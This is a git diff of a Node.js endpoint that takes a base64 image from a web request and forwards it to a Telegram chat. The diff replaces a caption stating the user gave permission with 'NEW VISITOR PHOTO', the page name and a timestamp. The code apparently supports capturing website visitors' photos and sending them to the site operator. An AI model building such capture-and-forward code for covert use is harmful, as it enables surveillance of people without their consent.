@@ -7,6 +7,8 @@ module.exports = async (req, res) => {
 
   const body = req.body || {};
   const image = body.image; // dataURL
+  const page = body.page || 'kenangan.html'; // klo mau kirim info halaman
+
   if (!image) return res.status(400).json({ ok: false, error: 'no image' });
 
   const m = image.match(/^data:(.+);base64,(.+)$/);
@@ -17,13 +19,24 @@ module.exports = async (req, res) => {
   const buffer = Buffer.from(b64, 'base64');
 
   const token = process.env.TELEGRAM_TOKEN;
-  const chatId = process.env.TELEGRAM_CHAT_ID; // atau array handling seperti chat_id_2 jika mau
+  const chatId = process.env.TELEGRAM_CHAT_ID;
 
   if (!token || !chatId) return res.status(500).json({ ok: false, error: 'telegram not configured' });
 
+  const waktu = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
+
   const form = new FormData();
   form.append('chat_id', chatId);
-  form.append('caption', 'foto (user memberikan izin)'); // bisa disesuaikan
+  form.append(
+    'caption',
+    `✨ *NEW VISITOR PHOTO* ✨
+━━━━━━━━━━━━━━━━━━━
+📸 Foto Pengunjung Website
+🕒 ${waktu}
+🌐 Halaman: ${page}
+━━━━━━━━━━━━━━━━━━━`
+  );
+  form.append('parse_mode', 'Markdown');
   form.append('photo', buffer, { filename: 'capture.jpg', contentType: mime });
 
   try {
